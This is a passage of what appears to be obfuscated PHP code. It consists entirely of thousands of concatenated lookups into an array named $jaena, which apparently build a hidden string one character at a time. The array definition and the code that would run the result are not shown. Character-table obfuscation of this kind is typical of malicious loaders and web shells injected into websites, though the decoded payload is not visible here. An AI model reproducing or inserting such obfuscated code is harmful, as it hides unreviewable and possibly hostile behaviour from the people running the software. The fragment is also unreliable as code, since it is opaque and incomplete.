aena[142].$jaena[128].$jaena[128].$jaena[38].$jaena[40].$jaena[64].$jaena[123].$jaena[26].$jaena[93].$jaena[62].$jaena[20].$jaena[19].$jaena[26].$jaena[39].$jaena[39].$jaena[48].$jaena[12].$jaena[39].$jaena[6].$jaena[26].$jaena[141].$jaena[128].$jaena[123].$jaena[35].$jaena[103].$jaena[5].$jaena[61].$jaena[72].$jaena[86].$jaena[12].$jaena[1].$jaena[17].$jaena[15].$jaena[97].$jaena[62].$jaena[74].$jaena[49].$jaena[86].$jaena[59].$jaena[103].$jaena[8].$jaena[49].$jaena[42].$jaena[128].$jaena[35].$jaena[47].$jaena[22].$jaena[123].$jaena[211].$jaena[3].$jaena[128].$jaena[136].$jaena[93].$jaena[68].$jaena[1].$jaena[159].$jaena[136].$jaena[60].$jaena[21].$jaena[32].$jaena[74].$jaena[28].$jaena[159].$jaena[20].$jaena[60].$jaena[61].$jaena[11].$jaena[8].$jaena[11].$jaena[56].$jaena[361].$jaena[159].$jaena[123].$jaena[47].$jaena[60].$jaena[49].$jaena[91].$jaena[60].$jaena[68].$jaena[86].$jaena[48].$jaena[68].$jaena[123].$jaena[40].$jaena[27].$jaena[136].$jaena[8].$jaena[21].$jaena[47].$jaena[15].$jaena[9].$jaena[0].$jaena[44].$jaena[13].$jaena[47].$jaena[46].$jaena[22].$jaena[5].$jaena[64].$jaena[4].$jaena[40].$jaena[7].$jaena[39].$jaena[46].$jaena[141].$jaena[3].$jaena[68].$jaena[361].$jaena[123].$jaena[20].$jaena[20].$jaena[47].$jaena[89].$jaena[142].$jaena[17].$jaena[103].$jaena[4].$jaena[126].$jaena[13].$jaena[17].$jaena[15].$jaena[126].$jaena[28].$jaena[49].$jaena[38].$jaena[27].$jaena[17].$jaena[61].$jaena[159].$jaena[74].$jaena[9].$jaena[103].$jaena[86].$jaena[56].$jaena[136].$jaena[86].$jaena[87].$jaena[79].$jaena[68].$jaena[9].$jaena[64].$jaena[32].$jaena[46].$jaena[89].$jaena[1].$jaena[64].$jaena[40].$jaena[86].$jaena[9].$jaena[86].$jaena[12].$jaena[74].$jaena[15].$jaena[42].$jaena[123].$jaena[7].$jaena[97].$jaena[17].$jaena[136].$jaena[128].$jaena[35].$jaena[35].$jaena[21].$jaena[60].$jaena[62].$jaena[59].$jaena[3].$jaena[91].$jaena[93].$jaena[42].$jaena[48].$jaena[2].$jaena[136].$jaena[1].$jaena[141].$jaena[128].$jaena[39].$jaena[42].$jaena[0].$jaena[2].$jaena[141].$jaena[42].$jaena[361].$jaena[5].$jaena[61].$jaena[8].$jaena[123].$jaena[22].$jaena[31].$jaena[13].$jaena[42].$jaena[127].$jaena[44].$jaena[3].$jaena[2].$jaena[12].$jaena[159].$jaena[1].$jaena[141].$jaena[12].$jaena[159].$jaena[25].$jaena[127].$jaena[49].$jaena[7].$jaena[1].$jaena[91].$jaena[128].$jaena[11].$jaena[361].$jaena[46].$jaena[48].$jaena[361].$jaena[8].$jaena[64].$jaena[103].$jaena[59].$jaena[91].$jaena[6].$jaena[2].$jaena[91].$jaena[60].$jaena[91].$jaena[142].$jaena[12].$jaena[128].$jaena[97].$jaena[39].$jaena[125].$jaena[89].$jaena[29].$jaena[9].$jaena[12].$jaena[79].$jaena[48].$jaena[159].$jaena[2].$jaena[211].$jaena[64].$jaena[47].$jaena[60].$jaena[8].$jaena[123].$jaena[25].$jaena[6].$jaena[141].$jaena[46].$jaena[47].$jaena[128].$jaena[361].$jaena[93].$jaena[125].$jaena[0].$jaena[9].$jaena[38].$jaena[159].$jaena[103].$jaena[31].$jaena[74].$jaena[60].$jaena[128].$jaena[29].$jaena[7].$jaena[61].$jaena[26].$jaena[142].$jaena[68].$jaena[72].$jaena[60].$jaena[56].$jaena[0].$jaena[31].$jaena[46].$jaena[211].$jaena[1].$jaena[60].$jaena[3].$jaena[126].$jaena[56].$jaena[42].$jaena[11].$jaena[46].$jaena[86].$jaena[62].$jaena[12].$jaena[74].$jaena[127].$jaena[62].$jaena[25].$jaena[5].$jaena[46].$jaena[42].$jaena[60].$jaena[126].$jaena[56].$jaena[12].$jaena[123].$jaena[49].$jaena[8].$jaena[9].$jaena[79].$jaena[61].$jaena[74].$jaena[211].$jaena[2].$jaena[59].$jaena[29].$jaena[128].$jaena[40].$jaena[60].$jaena[89].$jaena[62].$jaena[87].$jaena[9].$jaena[25].$jaena[48].$jaena[8].$jaena[32].$jaena[5].$jaena[13].$jaena[22].$jaena[26].$jaena[89].$jaena[93].$jaena[68].$jaena[97].$jaena[4].$jaena[159].$jaena[44].$jaena[60].$jaena[2].$jaena[86].$jaena[89].$jaena[68].$jaena[211].$jaena[20].$jaena[97].$jaena[38].$jaena[12].$jaena[11].$jaena[25].$jaena[159].$jaena[21].$jaena[40].$jaena[29].$jaena[17].$jaena[12].$jaena[35].$jaena[5].$jaena[136].$jaena[22].$jaena[141].$jaena[17].$jaena[19].$jaena[0].$jaena[91].$jaena[93].$jaena[89].$jaena[3].$jaena[21].$jaena[12].$jaena[31].$jaena[6].$jaena[56].$jaena[35].$jaena[26].$jaena[127].$jaena[42].$jaena[74].$jaena[13].$jaena[8].$jaena[8].$jaena[68].$jaena[60].$jaena[21].$jaena[211].$jaena[29].$jaena[31].$jaena[40].$jaena[27].$jaena[29].$jaena[6].$jaena[22].$jaena[22].$jaena[48].$jaena[68].$jaena[79].$jaena[127].$jaena[361].$jaena[20].$jaena[15].$jaena[25].$jaena[13].$jaena[19].$jaena[40].$jaena[8].$jaena[13].$jaena[126].$jaena[9].$jaena[38].$jaena[93].$jaena[19].$jaena[68].$jaena[48].$jaena[59].$jaena[142].$jaena[72].$jaena[127].$jaena[74].$jaena[68].$jaena[60].$jaena[3].$jaena[13].$jaena[8].$jaena[141].$jaena[38].$jaena[29].$jaena[0].$jaena[29].$jaena[31].$jaena[79].$jaena[159].$jaena[142].$jaena[40].$jaena[27].$jaena[4].$jaena[7].$jaena[211].$jaena[93].$jaena[27].$jaena[62].$jaena[27].$jaena[74].$jaena[46].$jaena[28].$jaena[361].$jaena[29].$jaena[5].$jaena[141].$jaena[26].$jaena[60].$jaena[61].$jaena[142].$jaena[46].$jaena[136].$jaena[39].$jaena[5].$jaena[44].$jaena[159].$jaena[46].$jaena[0].$jaena[44].$jaena[20].$jaena[21].$jaena[103].$jaena[39].$jaena[60].$jaena[9].$jaena[91].$jaena[127].$jaena[126].$jaena[40].$jaena[15].$jaena[87].$jaena[28].$jaena[26].$jaena[97].$jaena[39].$jaena[127].$jaena[87].$jaena[91].$jaena[25].$jaena[103].$jaena[9].$jaena[74].$jaena[8].$jaena[40].$jaena[56].$jaena[62].$jaena[32].$jaena[17].$jaena[49].$jaena[49].$jaena[26].$jaena[93].$jaena[46].$jaena[159].$jaena[79].$jaena[48].$jaena[46].$jaena[61].$jaena[29].$jaena[361].$jaena[26].$jaena[79].$jaena[29].$jaena[2].$jaena[61].$jaena[72].$jaena[15].$jaena[1].$jaena[4].$jaena[74].$jaena[35].$jaena[8].$jaena[56].$jaena[38].$jaena[361].$jaena[13].$jaena[74].$jaena[44].$jaena[64].$jaena[13].$jaena[12].$jaena[46].$jaena[20].$jaena[141].$jaena[127].$jaena[29].$jaena[21].$jaena[15].$jaena[89].$jaena[42].$jaena[126].$jaena[64].$jaena[31].$jaena[32].$jaena[19].$jaena[47].$jaena[86].$jaena[32].$jaena[123].$jaena[361].$jaena[87].$jaena[25].$jaena[40].$jaena[42].$jaena[28].$jaena[361].$jaena[15].$jaena[142].$jaena[0].$jaena[61].$jaena[62].$jaena[26].$jaena[62].$jaena[97].$jaena[56].$jaena[8].$jaena[127].$jaena[68].$jaena[142].$jaena[39].$jaena[29].$jaena[72].$jaena[97].$jaena[68].$jaena[89].$jaena[26].$jaena[74].$jaena[38].$jaena[3].$jaena[5].$jaena[79].$jaena[123].$jaena[74].$jaena[59].$jaena[59].$jaena[4].$jaena[38].$jaena[44].$jaena[21].$jaena[1].$jaena[32].$jaena[61].$jaena[7].$jaena[64].$jaena[46].$jaena[72].$jaena[86].$jaena[42].$jaena[7].$jaena[15].$jaena[0].$jaena[74].$jaena[4].$jaena[142].$jaena[62].$jaena[22].$jaena[125].$jaena[32].$jaena[128].$jaena[26].$jaena[40].$jaena[7].$jaena[6].$jaena[32].$jaena[46].$jaena[56].$jaena[27].$jaena[11].$jaena[64].$jaena[56].$jaena[56].$jaena[2].$jaena[26].$jaena[1].$jaena[20].$jaena[127].$jaena[62].$jaena[21].$jaena[26].$jaena[126].$jaena[48].$jaena[3].$jaena[13].$jaena[0].$jaena[211].$jaena[38].$jaena[61].$jaena[4].$jaena[136].$jaena[29].$jaena[38].$jaena[9].$jaena[59].$jaena[141].$jaena[6].$jaena[126].$jaena[25].$jaena[38].$jaena[74].$jaena[27].$jaena[72].$jaena[7].$jaena[35].$jaena[361].$jaena[74].$jaena[86].$jaena[141].$jaena[211].$jaena[5].$jaena[93].$jaena[136].$jaena[32].$jaena[123].$jaena[159].$jaena[49].$jaena[136].$jaena[141].$jaena[47].$jaena[9].$jaena[123].$jaena[97].$jaena[2].$jaena[11].$jaena[47].$jaena[361].$jaena[13].$jaena[31].$jaena[60].$jaena[136].$jaena[87].$jaena[127].$jaena[0].$jaena[61].$jaena[0].$jaena[2].$jaena[127].$jaena[361].$jaena[9].$jaena[12].$jaena[15].$jaena[159].$jaena[38].$jaena[19].$jaena[62].$jaena[47].$jaena[20].$jaena[44].$jaena[103].$jaena[103].$jaena[64].$jaena[211].$jaena[93].$jaena[59].$jaena[79].$jaena[61].$jaena[60].$jaena[38].$jaena[44].$jaena[126].$jaena[64].$jaena[32].$jaena[13].$jaena[128].$jaena[32].$jaena[40].$jaena[39].$jaena[123].$jaena[13].$jaena[68].$jaena[26].$jaena[89].$jaena[126].$jaena[128].$jaena[136].$jaena[74].$jaena[38].$jaena[91].$jaena[39].$jaena[11].$jaena[8].$jaena[32].$jaena[56].$jaena[1].$jaena[38].$jaena[48].$jaena[125].$jaena[29].$jaena[0].$jaena[93].$jaena[20].$jaena[87].$jaena[32].$jaena[42].$jaena[86].$jaena[6].$jaena[8].$jaena[11].$jaena[13].$jaena[25].$jaena[211].$jaena[60].$jaena[103].$jaena[211].$jaena[89].$jaena[17].$jaena[4].$jaena[159].$jaena[56].$jaena[40].$jaena[68].$jaena[89].$jaena[15].$jaena[97].$jaena[103].$jaena[159].$jaena[22].$jaena[93].$jaena[46].$jaena[29].$jaena[125].$jaena[126].$jaena[74].$jaena[93].$jaena[48].$jaena[123].$jaena[127].$jaena[136].$jaena[35].$jaena[61].$jaena[211].$jaena[91].$jaena[89].$jaena[123].$jaena[32].$jaena[13].$jaena[40].$jaena[125].$jaena[19].$jaena[13].$jaena[60].$jaena[20].$jaena[123].$jaena[20].$jaena[32].$jaena[49].$jaena[211].$jaena[44].$jaena[13].$jaena[19].$jaena[8].$jaena[29].$jaena[32].$jaena[6].$jaena[12].$jaena[15].$jaena[211].$jaena[125].$jaena[141].$jaena[25].$jaena[0].$jaena[60].$jaena[27].$jaena[1].$jaena[103].$jaena[74].$jaena[26].$jaena[28].$jaena[35].$jaena[31].$jaena[97].$jaena[39].$jaena[12].$jaena[1].$jaena[128].$jaena[13].$jaena[32].$jaena[4].$jaena[64].$jaena[79].$jaena[159].$jaena[17].$jaena[79].$jaena[31].$jaena[20].$jaena[48].$jaena[19].$jaena[39].$jaena[60].$jaena[9].$jaena[42].$jaena[127].$jaena[103].$jaena[2].$jaena[93].$jaena[29].$jaena[97].$jaena[20].$jaena[17].$jaena[7].$jaena[123].$jaena[11].$jaena[20].$jaena[12].$jaena[27].$jaena[46].$jaena[48].$jaena[4].$jaena[136].$jaena[31].$jaena[35].$jaena[8].$jaena[9].$jaena[29].$jaena[0].$jaena[91].$jaena[141].$jaena[89].$jaena[91].$jaena[91].$jaena[40].$jaena[97].$jaena[136].$jaena[21].$jaena[59].$jaena[6].$jaena[31].$jaena[31].$jaena[72].$jaena[68].$jaena[9].$jaena[142].$jaena[128].$jaena[64].$jaena[32].$jaena[48].$jaena[42].$jaena[56].$jaena[22].$jaena[74].$jaena[13].$jaena[28].$jaena[46].$jaena[26].$jaena[7].$jaena[38].$jaena[15].$jaena[64].$jaena[28].$jaena[86].$jaena[7].$jaena[5].$jaena[125].$jaena[86].$jaena[6].$jaena[15].$jaena[48].$jaena[35].$jaena[142].$jaena[136].$jaena[6].$jaena[28].$jaena[9].$jaena[19].$jaena[159].$jaena[91].$jaena[141].$jaena[211].$jaena[93].$jaena[361].$jaena[35].$jaena[12].$jaena[39].$jaena[25].$jaena[87].$jaena[25].$jaena[39].$jaena[128].$jaena[5].$jaena[1].$jaena[72].$jaena[42].$jaena[20].$jaena[87].$jaena[103].$jaena[48].$jaena[35].$jaena[42].$jaena[48].$jaena[123].$jaena[49].$jaena[68].$jaena[46].$jaena[7].$jaena[48].$jaena[127].$jaena[56].$jaena[74].$jaena[4].$jaena[211].$jaena[64].$jaena[56].$jaena[125].$jaena[6].$jaena[7].$jaena[47].$jaena[74].$jaena[0].$jaena[136].$jaena[27].$jaena[13].$jaena[64].$jaena[59].$jaena[35].$jaena[361].$jaena[26].$jaena[2].$jaena[123].$jaena[87].$jaena[46].$jaena[39].$jaena[87].$jaena[7].$jaena[49].$jaena[3].$jaena[8].$jaena[40].$jaena[38].$jaena[42].$jaena[32].$jaena[42].$jaena[125].$jaena[32].$jaena[72].$jaena[59].$jaena[35].$jaena[141].$jaena[74].$jaena[86].$jaena[127].$jaena[136].$jaena[31].$jaena[56].$jaena[127].$jaena[32].$jaena[74].$jaena[20].$jaena[141].$jaena[60].$jaena[123].$jaena[361].$jaena[38].$jaena[56].$jaena[74].$jaena[97].$jaena[28].$jaena[56].$jaena[38].$jaena[86].$jaena[20].$jaena[72].$jaena[17].$jaena[21].$jaena[62].$jaena[62].$jaena[87].$jaena[38].$jaena[136].$jaena[28].$jaena[72].$jaena[123].$jaena[2].$jaena[25].$jaena[56].$jaena[128].$jaena[21].$jaena[13].$jaena[28].$jaena[93].$jaena[32].$jaena[39].$jaena[159].$jaena[40].$jaena[136].$jaena[8].$jaena[11].$jaena[128].$jaena[127].$jaena[42].$jaena[20].$jaena[72].$jaena[6].$jaena[361].$jaena[31].$jaena[128].$jaena[125].$jaena[89].$jaena[20].$jaena[126].$jaena[17].$jaena[29].$jaena[141].$jaena[8].$jaena[68].$jaena[20].$jaena[20].$jaena[103].$jaena[91].$jaena[159].$jaena[35].$jaena[19].$jaena[64].$jaena[127].$jaena[26].$jaena[62].$jaena[141].$jaena[74].$jaena[15].$jaena[64].$jaena[59].$jaena[2].$jaena[127].$jaena[19].$jaena[6].$jaena[40].$jaena[103].$jaena[20].$jaena[93].$jaena[136].$jaena[0].$jaena[44].$jaena[128].$jaena[15].$jaena[21].$jaena[4].$jaena[3].$jaena[86].$jaena[87].$jaena[127].$jaena[5].$jaena[211].$jaena[361].$jaena[38].$jaena[136].$jaena[39].$jaena[64].$jaena[35].$jaena[361].$jaena[126].$jaena[28].$jaena[38].$jaena[127].$jaena[48].$jaena[91].$jaena[44].$jaena[5].$jaena[97].$jaena[87].$jaena[13].$jaena[1].$jaena[62].$jaena[29].$jaena[20].$jaena[125].$jaena[87].$jaena[19].$jaena[17].$jaena[22].$jaena[40].$jaena[27].$jaena[211].$jaena[64].$jaena[7].$jaena[19].$jaena[64].$jaena[64].$jaena[12].$jaena[87].$jaena[127].$jaena[361].$jaena[8].$jaena[48].$jaena[62].$jaena[31].$jaena[125].$jaena[39].$jaena[2].$jaena[20].$jaena[126].$jaena[93].$jaena[25].$jaena[27].$jaena[12].$jaena[26].$jaena[28].$jaena[9].$jaena[97].$jaena[44].$jaena[89].$jaena[44].$jaena[13].$jaena[103].$jaena[20].$jaena[74].$jaena[61].$jaena[61].$jaena[20].$jaena[361].$jaena[29].$jaena[11].$jaena[142].$jaena[59].$jaena[142].$jaena[38].$jaena[103].$jaena[38].$jaena[17].$jaena[3].$jaena[74].$jaena[361].$jaena[159].$jaena[87].$jaena[26].$jaena[44].$jaena[56].$jaena[42].$jaena[32].$jaena[40].$jaena[11].$jaena[97].$jaena[49].$jaena[97].$jaena[15].$jaena[126].$jaena[159].$jaena[62].$jaena[2].$jaena[128].$jaena[127].$jaena[46].$jaena[46].$jaena[123].$jaena[9].$jaena[1].$jaena[87].$jaena[3].$jaena[42].$jaena[91].$jaena[26].$jaena[91].$jaena[87].$jaena[141].$jaena[361].$jaena[6].$jaena[26].$jaena[87].$jaena[123].$jaena[123].$jaena[56].$jaena[27].$jaena[27].$jaena[32].$jaena[68].$jaena[142].$jaena[38].$jaena[49].$jaena[59].$jaena[123].$jaena[8].$jaena[93].$jaena[89].$jaena[86].$jaena[22].$jaena[31].$jaena[11].$jaena[11].$jaena[44].$jaena[29].$jaena[60].$jaena[68].$jaena[20].$jaena[40].$jaena[11].$jaena[59].$jaena[79].$jaena[211].$jaena[72].$jaena[56].$jaena[11].$jaena[32].$jaena[46].$jaena[1].$jaena[20].$jaena[93].$jaena[32].$jaena[44].$jaena[128].$jaena[1].$jaena[46].$jaena[15].$jaena[12].$jaena[126].$jaena[35].$jaena[89].$jaena[68].$jaena[123].$jaena[25].$jaena[211].$jaena[2].$jaena[123].$jaena[142].$jaena[9].$jaena[40].$jaena[141].$jaena[59].$jaena[6].$jaena[60].$jaena[38].$jaena[62].$jaena[42].$jaena[93].$jaena[125].$jaena[9].$jaena[72].$jaena[20].$jaena[0].$jaena[68].$jaena[128].$jaena[46].$jaena[35].$jaena[79].$jaena[25].$jaena[86].$jaena[46].$jaena[91].$jaena[28].$jaena[22].$jaena[211].$jaena[159].$jaena[1].$jaena[46].$jaena[42].$jaena[44].$jaena[56].$jaena[9].$jaena[38].$jaena[103].$jaena[127].$jaena[48].$jaena[141].$jaena[21].$jaena[0].$jaena[48].$jaena[0].$jaena[126].$jaena[5].$jaena[0].$jaena[42].$jaena[128].$jaena[39].$jaena[79].$jaena[126].$jaena[9].$jaena[126].$jaena[74].$jaena[159].$jaena[142].$jaena[39].$jaena[19].$jaena[31].$jaena[28].$jaena[86].$jaena[62].$jaena[136].$jaena[127].$jaena[126].$jaena[7].$jaena[89].$jaena[8].$jaena[211].$jaena[87].$jaena[2].$jaena[97].$jaena[128].$jaena[126].$jaena[123].$jaena[136].$jaena[136].$jaena[46].$jaena[86].$jaena[1].$jaena[1].$jaena[15].$jaena[49].$jaena[42].$jaena[21].$jaena[128].$jaena[26].$jaena[128].$jaena[127].$jaena[136].$jaena[64].$jaena[7].$jaena[6].$jaena[93].$jaena[126].$jaena[17].$jaena[39].$jaena[127].$jaena[19].$jaena[4].$jaena[142].$jaena[87].$jaena[126].$jaena[42].$jaena[1].$jaena[211].$jaena[126].$jaena[3].$jaena[13].$jaena[12].$jaena[12].$jaena[46].$jaena[48].$jaena[27].$jaena[89].$jaena[123].$jaena[136].$jaena[22].$jaena[1].$jaena[64].$jaena[136].$jaena[1].$jaena[142].$jaena[28].$jaena[15].$jaena[4].$jaena[72].$jaena[136].$jaena[29].$jaena[1].$jaena[361].$jaena[4].$jaena[125].$jaena[26].$jaena[103].$jaena[48].$jaena[13].$jaena[136].$jaena[128].$jaena[60].$jaena[64].$jaena[29].$jaena[1].$jaena[87].$jaena[91].$jaena[6].$jaena[49].$jaena[19].$jaena[62].$jaena[26].$jaena[125].$jaena[97].$jaena[13].$jaena[125].$jaena[35].$jaena[5].$jaena[28].$jaena[47].$jaena[40].$jaena[28].$jaena[5].$jaena[123].$jaena[35].$jaena[12].$jaena[8].$jaena[3].$jaena[4].$jaena[22].$jaena[27].$jaena[89].$jaena[39].$jaena[48].$jaena[361].$jaena[79].$jaena[40].$jaena[93].$jaena[25].$jaena[20].$jaena[56].$jaena[12].$jaena[72].$jaena[68].$jaena[19].$jaena[56].$jaena[6].$jaena[2].$jaena[3].$jaena[7].$jaena[97].$jaena[13].$jaena[0].$jaena[42].$jaena[72].$jaena[27].$jaena[9].$jaena[127].$jaena[35].$jaena[361].$jaena[64].$jaena[13].$jaena[142].$jaena[12].$jaena[103].$jaena[25].$jaena[3].$jaena[97].$jaena[11].$jaena[93].$jaena[62].$jaena[20].$jaena[26].$jaena[21].$jaena[142].$jaena[4].$jaena[127].$jaena[103].$jaena[39].$jaena[21].$jaena[141].$jaena[79].$jaena[126].$jaena[28].$jaena[56].$jaena[123].$jaena[35].$jaena[22].$jaena[44].$jaena[29].$jaena[60].$jaena[127].$jaena[28].$jaena[13].$jaena[47].$jaena[141].$jaena[64].$jaena[2].$jaena[126].$jaena[60].$jaena[136].$jaena[79].$jaena[28].$jaena[56].$jaena[211].$jaena[27].$jaena[40].$jaena[59].$jaena[86].$jaena[35].$jaena[3].$jaena[159].$jaena[28].$jaena[86].$jaena[11].$jaena[141].$jaena[2].$jaena[123].$jaena[27].$jaena[361].$jaena[89].$jaena[7].$jaena[60].$jaena[15].$jaena[12].$jaena[42].$jaena[49].$jaena[13].$jaena[29].$jaena[40].$jaena[13].$jaena[68].$jaena[97].$jaena[125].$jaena[44].$jaena[46].$jaena[42].$jaena[141].$jaena[62].$jaena[12].$jaena[11].$jaena[93].$jaena[7].$jaena[47].$jaena[5].$jaena[46].$jaena[3].$jaena[48].$jaena[86].$jaena[127].$jaena[32].$jaena[103].$jaena[12].$jaena[361].$jaena[159].$jaena[141].$jaena[125].$jaena[19].$jaena[22].$jaena[61].$jaena[4].$jaena[1].$jaena[97].$jaena[93].$jaena[35].$jaena[32].$jaena[123].$jaena[68].$jaena[11].$jaena[2].$jaena[7].$jaena[5].$jaena[29].$jaena[59].$jaena[1].$jaena[125].$jaena[27].$jaena[20].$jaena[29].$jaena[3].$jaena[79].$jaena[361].$jaena[61].$jaena[93].$jaena[20].$jaena[142].$jaena[44].$jaena[0].$jaena[68].$jaena[61].$jaena[60].$jaena[59].$jaena[44].$jaena[126].$jaena[7].$jaena[6].$jaena[25].$jaena[87].$jaena[13].$jaena[19].$jaena[79].$jaena[12].$jaena[35].$jaena[159].$jaena[79].$jaena[15].$jaena[47].$jaena[9].$jaena[25].$jaena[13].$jaena[27].$jaena[20].$jaena[103].$jaena[128].$jaena[42].$jaena[9].$jaena[47].$jaena[11].$jaena[1].$jaena[49].$jaena[141].$jaena[12].$jaena[123].$jaena[68].$jaena[46].$jaena[15].$jaena[29].$jaena[49].$jaena[13].$jaena[87].$jaena[17].$jaena[3].$jaena[125].$jaena[12].$jaena[6].$jaena[62].$jaena[13].$jaena[87].$jaena[91].$jaena[25].$jaena[125].$jaena[47].$jaena[91].$jaena[25].$jaena[12].$jaena[87].$jaena[159].$jaena[127].$jaena[0].$jaena[31].$jaena[62].$jaena[44].$jaena[49].$jaena[211].$jaena[17].$jaena[361].$jaena[25].$jaena[89].$jaena[11].$jaena[0].$jaena[103].$jaena[361].$jaena[89].$jaena[60].$jaena[128].$jaena[211].$jaena[141].$jaena[74].$jaena[20].$jaena[31].$jaena[1].$jaena[1].$jaena[74].$jaena[15].$jaena[0].$jaena[25].$jaena[126].$jaena[28].$jaena[13].$jaena[22].$jaena[89].$jaena[86].$jaena[13].$jaena[46].$jaena[40].$jaena[27].$jaena[40].$jaena[8].$jaena[9].$jaena[35].$jaena[6].$jaena[103].$jaena[86].$jaena[1].$jaena[32].$jaena[26].$jaena[0].$jaena[127].$jaena[2].$jaena[211].$jaena[9].$jaena[31].$jaena[59].$jaena[142].$jaena[46].$jaena[7].$jaena[11].$jaena[32].$jaena[42].$jaena[74].$jaena[86].$jaena[87].$jaena[87].$jaena[29].$jaena[35].$jaena[142].$jaena[20].$jaena[61].$jaena[68].$jaena[21].$jaena[5].$jaena[97].$jaena[31].$jaena[61].$jaena[5].$jaena[15].$jaena[39].$jaena[127].$jaena[40].$jaena[141].$jaena[123].$jaena[2].$jaena[62].$jaena[27].$jaena[20].$jaena[91].$jaena[86].$jaena[15].$jaena[44].$jaena[97].$jaena[25].$jaena[46].$jaena[38].$jaena[27].$jaena[20].$jaena[87].$jaena[60].$jaena[5].$jaena[35].$jaena[142].$jaena[142].$jaena[2].$jaena[22].$jaena[22].$jaena[103].$jaena[15].$jaena[39].$jaena[56].$jaena[35].$jaena[49].$jaena[27].$jaena[136].$jaena[91].$jaena[11].$jaena[29].$jaena[142].$jaena[38].$jaena[12].$jaena[29].$jaena[97].$jaena[61].$jaena[68].$jaena[44].$jaena[6].$jaena[136].$jaena[49].$jaena[79].$jaena[28].$jaena[56].$jaena[31].$jaena[32].$jaena[25].$jaena[91].$jaena[15].$jaena[19].$jaena[97].$jaena[60].$jaena[7].$jaena[62].$jaena[103].$jaena[159].$jaena[28].$jaena[19].$jaena[49].$jaena[211].$jaena[28].$jaena[127].$jaena[59].$jaena[60].$jaena[89].$jaena[40].$jaena[89].$jaena[79].$jaena[159].$jaena[42].$jaena[1].$jaena[123].$jaena[42].$jaena[42].$jaena[93].$jaena[47].$jaena[56].$jaena[0].$jaena[49].$jaena[3].$jaena[56].$jaena[27].$jaena[48].$jaena[159].$jaena[28].$jaena[19].$jaena[62].$jaena[39].$jaena[32].$jaena[103].$jaena[21].$jaena[19].$jaena[39].$jaena[8].$jaena[361].$jaena[25].$jaena[8].$jaena[1].$jaena[56].$jaena[136].$jaena[123].$jaena[38].$jaena[159].$jaena[361].$jaena[6].$jaena[159].$jaena[25].$jaena[9].$jaena[2].$jaena[47].$jaena[61].$jaena[3].$jaena[97].$jaena[40].$jaena[56].$jaena[12].$jaena[68].$jaena[60].$jaena[17].$jaena[211].$jaena[8].$jaena[2].$jaena[127].$jaena[62].$jaena[13].$jaena[21].$jaena[60].$jaena[17].$jaena[12].$jaena[74].$jaena[22].$jaena[39].$jaena[61].$jaena[39].$jaena[91].$jaena[19].$jaena[68].$jaena[20].$jaena[28].$jaena[1].$jaena[86].$jaena[56].$jaena[42].$jaena[89].$jaena[2].$jaena[3].$jaena[20].$jaena[141].$jaena[97].$jaena[15].$jaena[91].$jaena[142].$jaena[141].$jaena[56].$jaena[3].$jaena[89].$jaena[9].$jaena[123].$jaena[38].$jaena[125].$jaena[13].$jaena[56].$jaena[123].$jaena[3].$jaena[103].$jaena[48].$jaena[159].$jaena[211].$jaena[28].$jaena[74].$jaena[141].$jaena[74].$jaena[47].$jaena[7].$jaena[86].$jaena[211].$jaena[5].$jaena[361].$jaena[5].$jaena[7].$jaena[79].$jaena[123].$jaena[0].$jaena[19].$jaena[97].$jaena[4].$jaena[15].$jaena[91].$jaena[13].$jaena[39].$jaena[2].$jaena[72].$jaena[56].$jaena[49].$jaena[211].$jaena[142].$jaena[141].$jaena[142].$jaena[17].$jaena[47].$jaena[4].$jaena[13].$jaena[125].$jaena[27].$jaena[123].$jaena[89].$jaena[47].$jaena[32].$jaena[46].$jaena[29].$jaena[27].$jaena[87].$jaena[26].$jaena[35].$jaena[11].$jaena[19].$jaena[127].$jaena[9].$jaena[103].$jaena[128].$jaena[136].$jaena[17].$jaena[89].$jaena[128].$jaena[48].$jaena[7].$jaena[59].$jaena[86].$jaena[35].$jaena[11].$jaena[103].$jaena[8].$jaena[6].$jaena[1].$jaena[15].$jaena[31].$jaena[142].$jaena[89].$jaena[48].$jaena[136].$jaena[2].$jaena[1].$jaena[49].$jaena[7].$jaena[9].$jaena[47].$jaena[29].$jaena[125].$jaena[126].$jaena[93].$jaena[142].$jaena[12].$jaena[27].$jaena[32].$jaena[38].$jaena[74].$jaena[64].$jaena[46].$jaena[103].$jaena[4].$jaena[29].$jaena[9].$jaena[128].$jaena[35].$jaena[136].$jaena[47].$jaena[17].$jaena[72].$jaena[159].$jaena[123].$jaena[7].$jaena[62].$jaena[32].$jaena[27].$jaena[26].$jaena[136].$jaena[0].$jaena[68].$jaena[15].$jaena[1].$jaena[7].$jaena[60].$jaena[20].$jaena[48].$jaena[47].$jaena[49].$jaena[27].$jaena[26].$jaena[142].$jaena[60].$jaena[128].$jaena[59].$jaena[6].$jaena[91].$jaena[29].$jaena[4].$jaena[27].$jaena[7].$jaena[32].$jaena[74].$jaena[32].$jaena[2].$jaena[0].$jaena[74].$jaena[9].$jaena[44].$jaena[211].$jaena[59].$jaena[127].$jaena[5].$jaena[17].$jaena[44].$jaena[68].$jaena[17].$jaena[35].$jaena[59].$jaena[0].$jaena[19].$jaena[136].$jaena[86].$jaena[39].$jaena[15].$jaena[15].$jaena[91].$jaena[20].$jaena[86].$jaena[15].$jaena[39].$jaena[74].$jaena[39].$jaena[7].$jaena[62].$jaena[361].$jaena[142].$jaena[62].$jaena[61].$jaena[2].$jaena[39].$jaena[93].$jaena[97].$jaena[126].$jaena[49].$jaena[72].$jaena[72].$jaena[28].$jaena[159].$jaena[17].$jaena[11].$jaena[20].$jaena[136].$jaena[62].$jaena[28].$jaena[38].$jaena[21].$jaena[42].$jaena[87].$jaena[103].$jaena[86].$jaena[3].$jaena[28].$jaena[64].$jaena[211].$jaena[27].$jaena[86].$jaena[2].$jaena[60].$jaena[361].$jaena[28].$jaena[125].$jaena[46].$jaena[17].$jaena[39].$jaena[68].$jaena[3].$jaena[6].$jaena[79].$jaena[141].$jaena[15].$jaena[61].$jaena[103].$jaena[20].$jaena[62].$jaena[32].$jaena[38].$jaena[136].$jaena[21].$jaena[62].$jaena[7].$jaena[86].$jaena[60].$jaena[6].$jaena[126].$jaena[68].$jaena[141].$jaena[27].$jaena[11].$jaena[87].$jaena[27].$jaena[21].$jaena[91].$jaena[0].$jaena[86].$jaena[46].$jaena[87].$jaena[31].$jaena[48].$jaena[31].$jaena[87].$jaena[32].$jaena[103].$jaena[42].$jaena[25].$jaena[26].$jaena[59].$jaena[61].$jaena[12].$jaena[72].$jaena[22].$jaena[40].$jaena[103].$jaena[89].$jaena[136].$jaena[86].$jaena[31].$jaena[20].$jaena[28].$jaena[27].$